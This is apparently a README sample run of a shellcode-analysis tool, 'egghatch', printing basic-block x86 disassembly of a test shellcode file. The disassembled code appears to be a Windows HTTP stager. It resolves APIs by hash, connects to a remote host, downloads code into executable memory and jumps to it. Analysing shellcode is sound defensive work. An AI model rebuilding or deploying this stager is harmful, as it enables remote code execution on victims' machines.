# sample run

```
➜  egghatch-basic-blocks git:(master) ✗ cat tests/files/plain/1.bin | egghatch
--------------------------------------------------------------------------------
0x0000: 	cld	
0x0001: 	call	0x88
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0088: 	pop	ebp
0x0089: 	push	0x74656e
0x008e: 	push	0x696e6977
0x0093: 	push	esp
0x0094: 	push	0x726774c
0x0099: 	call	ebp
0x009b: 	xor	ebx, ebx
0x009d: 	push	ebx
0x009e: 	push	ebx
0x009f: 	push	ebx
0x00a0: 	push	ebx
0x00a1: 	push	ebx
0x00a2: 	push	0xa779563a
0x00a7: 	call	ebp
0x00a9: 	push	ebx
0x00aa: 	push	ebx
0x00ab: 	push	3
0x00ad: 	push	ebx
0x00ae: 	push	ebx
0x00af: 	push	0x1cec
0x00b4: 	call	0x145
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0145: 	pop	edi
0x0146: 	call	0xc0
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x00c0: 	push	eax
0x00c1: 	push	0xc69f8957
0x00c6: 	call	ebp
0x00c8: 	mov	esi, eax
0x00ca: 	push	ebx
0x00cb: 	push	0x84e03200
0x00d0: 	push	ebx
0x00d1: 	push	ebx
0x00d2: 	push	ebx
0x00d3: 	push	edi
0x00d4: 	push	ebx
0x00d5: 	push	esi
0x00d6: 	push	0x3b2e55eb
0x00db: 	call	ebp
0x00dd: 	xchg	eax, esi
0x00de: 	push	0xa
0x00e0: 	pop	edi
0x00e1: 	push	0x3380
0x00e6: 	mov	eax, esp
0x00e8: 	push	4
0x00ea: 	push	eax
0x00eb: 	push	0x1f
0x00ed: 	push	esi
0x00ee: 	push	0x869e4675
0x00f3: 	call	ebp
0x00f5: 	push	ebx
0x00f6: 	push	ebx
0x00f7: 	push	ebx
0x00f8: 	push	ebx
0x00f9: 	push	esi
0x00fa: 	push	0x7b18062d
0x00ff: 	call	ebp
0x0101: 	test	eax, eax
0x0103: 	jne	0x10f
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x010f: 	push	0x40
0x0111: 	push	0x1000
0x0116: 	push	0x400000
0x011b: 	push	ebx
0x011c: 	push	0xe553a458
0x0121: 	call	ebp
0x0123: 	xchg	eax, ebx
0x0124: 	push	ebx
0x0125: 	push	ebx
0x0126: 	mov	edi, esp
0x0128: 	push	edi
0x0129: 	push	0x2000
0x012e: 	push	ebx
0x012f: 	push	esi
0x0130: 	push	0xe2899612
0x0135: 	call	ebp
0x0137: 	test	eax, eax
0x0139: 	je	0x108
0x013b: 	mov	eax, dword ptr [edi]
0x013d: 	add	ebx, eax
0x013f: 	test	eax, eax
0x0141: 	jne	0x128
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0128: 	push	edi
0x0129: 	push	0x2000
0x012e: 	push	ebx
0x012f: 	push	esi
0x0130: 	push	0xe2899612
0x0135: 	call	ebp
0x0137: 	test	eax, eax
0x0139: 	je	0x108
0x013b: 	mov	eax, dword ptr [edi]
0x013d: 	add	ebx, eax
0x013f: 	test	eax, eax
0x0141: 	jne	0x128
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0143: 	pop	eax
0x0144: 	ret	
0x0145: 	pop	edi
0x0146: 	call	0xc0
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x014b: 	ja	0x1c4
0x014d: 	ja	0x17d
0x014f: 	jae	0x1b6
0x0151: 	jb	0x1c9
0x0153: 	imul	esp, dword ptr [ebx + 0x65], 0x7268632e
0x015a: 	outsd	dx, dword ptr [esi]
0x015b: 	insd	dword ptr es:[edi], dx
0x015c: 	sub	eax, 0x642e7075
0x0162: 	popal	
0x0163: 	je	0x1ca
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0105: 	dec	edi
0x0106: 	jne	0xe1
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x00e1: 	push	0x3380
0x00e6: 	mov	eax, esp
0x00e8: 	push	4
0x00ea: 	push	eax
0x00eb: 	push	0x1f
0x00ed: 	push	esi
0x00ee: 	push	0x869e4675
0x00f3: 	call	ebp
0x00f5: 	push	ebx
0x00f6: 	push	ebx
0x00f7: 	push	ebx
0x00f8: 	push	ebx
0x00f9: 	push	esi
0x00fa: 	push	0x7b18062d
0x00ff: 	call	ebp
0x0101: 	test	eax, eax
0x0103: 	jne	0x10f
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0108: 	push	0x56a2b5f0
0x010d: 	call	ebp
0x010f: 	push	0x40
0x0111: 	push	0x1000
0x0116: 	push	0x400000
0x011b: 	push	ebx
0x011c: 	push	0xe553a458
0x0121: 	call	ebp
0x0123: 	xchg	eax, ebx
0x0124: 	push	ebx
0x0125: 	push	ebx
0x0126: 	mov	edi, esp
0x0128: 	push	edi
0x0129: 	push	0x2000
0x012e: 	push	ebx
0x012f: 	push	esi
0x0130: 	push	0xe2899612
0x0135: 	call	ebp
0x0137: 	test	eax, eax
0x0139: 	je	0x108
0x013b: 	mov	eax, dword ptr [edi]
0x013d: 	add	ebx, eax
0x013f: 	test	eax, eax
0x0141: 	jne	0x128
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x00b9: 	das	
0x00ba: 	xor	bh, byte ptr [eax]
0x00bc: 	xor	bh, byte ptr [ecx + 0x47]
0x00bf: 	add	byte ptr [eax + 0x68], dl
0x00c2: 	push	edi
0x00c3: 	mov	dword ptr [edi - 0x762a003a], ebx
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0006: 	pushal	
0x0007: 	mov	ebp, esp
0x0009: 	xor	eax, eax
0x000b: 	mov	edx, dword ptr fs:[eax + 0x30]
0x000f: 	mov	edx, dword ptr [edx + 0xc]
0x0012: 	mov	edx, dword ptr [edx + 0x14]
0x0015: 	mov	esi, dword ptr [edx + 0x28]
0x0018: 	movzx	ecx, word ptr [edx + 0x26]
0x001c: 	xor	edi, edi
0x001e: 	lodsb	al, byte ptr [esi]
0x001f: 	cmp	al, 0x61
0x0021: 	jl	0x25
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0025: 	ror	edi, 0xd
0x0028: 	add	edi, eax
0x002a: 	loop	0x1e
0x002c: 	push	edx
0x002d: 	push	edi
0x002e: 	mov	edx, dword ptr [edx + 0x10]
0x0031: 	mov	ecx, dword ptr [edx + 0x3c]
0x0034: 	mov	ecx, dword ptr [ecx + edx + 0x78]
0x0038: 	jecxz	0x82
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0082: 	pop	edi
0x0083: 	pop	edx
0x0084: 	mov	edx, dword ptr [edx]
0x0086: 	jmp	0x15
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0015: 	mov	esi, dword ptr [edx + 0x28]
0x0018: 	movzx	ecx, word ptr [edx + 0x26]
0x001c: 	xor	edi, edi
0x001e: 	lodsb	al, byte ptr [esi]
0x001f: 	cmp	al, 0x61
0x0021: 	jl	0x25
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0023: 	sub	al, 0x20
0x0025: 	ror	edi, 0xd
0x0028: 	add	edi, eax
0x002a: 	loop	0x1e
0x002c: 	push	edx
0x002d: 	push	edi
0x002e: 	mov	edx, dword ptr [edx + 0x10]
0x0031: 	mov	ecx, dword ptr [edx + 0x3c]
0x0034: 	mov	ecx, dword ptr [ecx + edx + 0x78]
0x0038: 	jecxz	0x82
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x003a: 	add	ecx, edx
0x003c: 	push	ecx
0x003d: 	mov	ebx, dword ptr [ecx + 0x20]
0x0040: 	add	ebx, edx
0x0042: 	mov	ecx, dword ptr [ecx + 0x18]
0x0045: 	jecxz	0x81
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0081: 	pop	edi
0x0082: 	pop	edi
0x0083: 	pop	edx
0x0084: 	mov	edx, dword ptr [edx]
0x0086: 	jmp	0x15
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0047: 	dec	ecx
0x0048: 	mov	esi, dword ptr [ebx + ecx*4]
0x004b: 	add	esi, edx
0x004d: 	xor	edi, edi
0x004f: 	lodsb	al, byte ptr [esi]
0x0050: 	ror	edi, 0xd
0x0053: 	add	edi, eax
0x0055: 	cmp	al, ah
0x0057: 	jne	0x4f
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x004f: 	lodsb	al, byte ptr [esi]
0x0050: 	ror	edi, 0xd
0x0053: 	add	edi, eax
0x0055: 	cmp	al, ah
0x0057: 	jne	0x4f
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0059: 	add	edi, dword ptr [ebp - 8]
0x005c: 	cmp	edi, dword ptr [ebp + 0x24]
0x005f: 	jne	0x45
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0045: 	jecxz	0x81
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
0x0061: 	pop	eax
0x0062: 	mov	ebx, dword ptr [eax + 0x24]
0x0065: 	add	ebx, edx
0x0067: 	mov	cx, word ptr [ebx + ecx*2]
0x006b: 	mov	ebx, dword ptr [eax + 0x1c]
0x006e: 	add	ebx, edx
0x0070: 	mov	eax, dword ptr [ebx + ecx*4]
0x0073: 	add	eax, edx
0x0075: 	mov	dword ptr [esp + 0x24], eax
0x0079: 	pop	ebx
0x007a: 	pop	ebx
0x007b: 	popal	
0x007c: 	pop	ecx
0x007d: 	pop	edx
0x007e: 	push	ecx
0x007f: 	jmp	eax
0x0081: 	pop	edi
0x0082: 	pop	edi
0x0083: 	pop	edx
0x0084: 	mov	edx, dword ptr [edx]
0x0086: 	jmp	0x15
--------------------------------------------------------------------------------
```
